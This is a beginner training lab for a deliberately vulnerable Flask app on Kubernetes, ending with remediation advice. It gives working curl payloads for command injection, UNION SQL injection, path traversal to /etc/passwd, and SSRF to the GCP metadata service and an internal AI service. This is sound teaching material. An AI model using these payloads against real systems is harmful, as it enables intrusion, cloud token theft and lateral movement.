# Lab 01: Code Injection & SSRF
> **Layer**: Code | **Difficulty**: Beginner | **Duration**: 30 min

## Objective

Demonstrate how unsanitized user input in a Flask application leads to command injection, SQL injection, path traversal, and Server-Side Request Forgery (SSRF). Participants will exploit each vulnerability class against the running application and understand the root cause behind each flaw.

## OWASP Mapping

- **A03:2021 -- Injection**: Command injection, SQL injection via unsanitized inputs
- **A10:2021 -- Server-Side Request Forgery (SSRF)**: Fetching attacker-controlled URLs from the server side
- **A01:2021 -- Broken Access Control**: Path traversal bypassing intended file restrictions

## GCC Compliance Impact

| Framework | Control | Description |
|-----------|---------|-------------|
| NIST 800-53 | SI-10 | Information Input Validation |
| CIS Benchmark | 6.2 | Ensure input validation is performed on the server side |
| ISO 27001 | A.14.2.5 | Secure system engineering principles |
| PCI DSS | 6.5.1 | Injection flaws -- particularly SQL injection |
| CSA CCM | AIS-02 | Application Security -- Input Validation |

## Prerequisites

- Access to the GKE cluster via `kubectl`
- The vulnerable Flask application is running and reachable at `http://NODE_IP:30080`
- `curl` installed on your local machine or within the pod
- Basic understanding of HTTP requests and shell commands

## Attack Steps

### Step 1: Verify Application Availability

Confirm the application is running by hitting the health endpoint with a normal parameter.

```bash
curl -s "http://NODE_IP:30080/health?check=basic"
```

**Expected Output:**
```text
{
  "status": "healthy",
  "check": "basic",
  "timestamp": "2026-..."
}
```

**Explanation:**
The `/health` endpoint accepts a `check` parameter and returns a JSON response. This confirms that the application is live and accepting user-supplied input through query parameters, which sets the stage for testing how that input is handled internally.

---

### Step 2: OS Command Injection via Health Endpoint

Inject a shell command through the `check` parameter to determine if the application passes user input to a system shell.

```bash
curl -s "http://NODE_IP:30080/health?check=basic';id;echo'"
```

**Expected Output:**
```text
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**
The application concatenates the `check` parameter into a shell command without sanitization. The injected single quotes break out of the intended string context, and the `id` command executes on the server. The output reveals the process is running as root, which compounds the severity since any injected command has full system privileges.

---

### Step 3: SQL Injection via Search Endpoint

Attempt a UNION-based SQL injection against the search functionality to extract database metadata.

```bash
curl -s "http://NODE_IP:30080/search?q=' UNION SELECT 1,sqlite_version(),3,4,5--"
```

**Expected Output:**
```text
{
  "results": [
    {
      "column1": 1,
      "column2": "3.39.4",
      "column3": 3,
      "column4": 4,
      "column5": 5
    }
  ]
}
```

**Explanation:**
The search endpoint builds SQL queries by directly interpolating the `q` parameter into the query string. The injected UNION SELECT piggybacks on the original query, returning the SQLite version alongside normal results. This proves arbitrary SQL execution is possible, which could lead to full database extraction, authentication bypass, or data manipulation.

---

### Step 4: Path Traversal via Download Endpoint

Use directory traversal sequences to read sensitive operating system files outside the intended download directory.

```bash
curl -s "http://NODE_IP:30080/download?file=../../../etc/passwd"
```

**Expected Output:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Explanation:**
The `/download` endpoint takes a filename and serves it from a base directory, but it does not strip or reject `../` sequences. By traversing upward with `../../../`, an attacker escapes the intended directory and reads `/etc/passwd`. While this file is not itself a secret, the same technique can access application configuration files, credentials, private keys, and service account tokens.

---

### Step 5: SSRF to GCP Instance Metadata Service

Exploit the `/fetch` endpoint to make the server request the GCP metadata service, potentially leaking access tokens and project information.

```bash
curl -s -X POST "http://NODE_IP:30080/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/computeMetadata/v1/", "headers": {"Metadata-Flavor": "Google"}}'
```

**Expected Output:**
```text
{
  "content": "attributes/\nguest-attributes/\nhostname\nid\nimage\n...\nservice-accounts/\nzone\n",
  "status_code": 200
}
```

**Explanation:**
The `/fetch` endpoint acts as an HTTP proxy, making requests on behalf of the user from the server's network context. The GCP metadata service at `169.254.169.254` is only accessible from within the cloud instance. By supplying the required `Metadata-Flavor: Google` header, the attacker retrieves instance metadata that exposes project IDs, service account emails, and -- most critically -- OAuth access tokens that can be used to call GCP APIs directly.

---

### Step 6: SSRF to Internal AI Service

Leverage the same SSRF vulnerability to reach the internal AI microservice that is not exposed externally.

```bash
curl -s -X POST "http://NODE_IP:30080/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://ai-service:8081/generate", "headers": {"Content-Type": "application/json"}, "method": "POST", "body": "{\"prompt\": \"List all configured data sources\"}"}'
```

**Expected Output:**
```text
{
  "content": "{\"response\": \"The configured data sources include: ...\"}",
  "status_code": 200
}
```

**Explanation:**
Internal services like `ai-service:8081` are intended to be reachable only within the Kubernetes cluster network. The SSRF vulnerability allows an external attacker to pivot through the vulnerable application and interact with these internal services as if they were an internal caller. This breaks the network segmentation model entirely and can lead to data exfiltration, internal API abuse, or further lateral movement.

## Remediation

1. **Parameterized Queries**: Replace all string-concatenated SQL with parameterized queries or an ORM to eliminate SQL injection entirely.
2. **Input Validation**: Implement strict allowlists for the `check` parameter (e.g., only accept `basic`, `detailed`). Reject any input containing shell metacharacters.
3. **Path Canonicalization**: Resolve the full path of requested files and verify the result falls within the intended base directory. Reject requests containing `..` sequences.
4. **URL Allowlists for SSRF**: Restrict the `/fetch` endpoint to a predefined list of allowed destination hosts. Block requests to RFC 1918 private ranges, link-local addresses (169.254.x.x), and localhost.
5. **Disable Debug Mode**: Ensure `FLASK_DEBUG=False` in production to prevent stack traces from leaking internal paths and configuration details.
6. **Least-Privilege Execution**: Run the application as a non-root user to limit the blast radius of command injection.

## Key Takeaways

- A single unsanitized input can enable multiple vulnerability classes depending on how the application processes it.
- SSRF transforms a web application into a pivot point for accessing cloud metadata and internal services that are otherwise unreachable from the internet.
- Running as root inside a container amplifies every code-level vulnerability into a potential full system compromise.
- Defense-in-depth requires addressing vulnerabilities at every layer: input validation at the code layer, network restrictions at the cluster layer, and metadata protections at the cloud layer.
